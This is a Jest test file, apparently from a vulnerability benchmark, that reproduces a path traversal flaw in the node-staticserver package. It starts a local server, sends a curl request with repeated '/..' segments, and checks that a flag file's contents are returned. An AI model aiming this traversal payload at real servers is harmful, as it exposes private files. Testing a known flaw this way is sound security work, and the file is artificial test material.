const path = require('path');
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v303 = '/..'.repeat(50);
    const v304 = v303 + pathToFlag;
    return v304;
};
const v317 = done => {
    const v305 = expect.assertions(1);
    v305;
    const pkg = require('node-staticserver');
    const fs = require('fs');
    const v306 = require('child_process');
    const exec = v306.exec;
    const v307 = fs.readFileSync(pathToFlag);
    let hostsFile = v307.toString();
    const a = require('child_process');
    try {
        const v308 = () => {
        };
        const v309 = a.execSync('fuser -k 8983/tcp', v308);
        v309;
    } catch (e) {
    }
    let app = pkg();
    const v310 = app.listen(8983);
    v310;
    const v311 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:8983${ v311 }"`;
    const v315 = (error, stdout) => {
        const v312 = expect(stdout);
        const v313 = v312.toBe(hostsFile);
        v313;
        const v314 = done();
        v314;
    };
    const v316 = exec(attack_string, v315);
    v316;
};
const v318 = test('Path Traversal in node-staticserver', v317);
v318;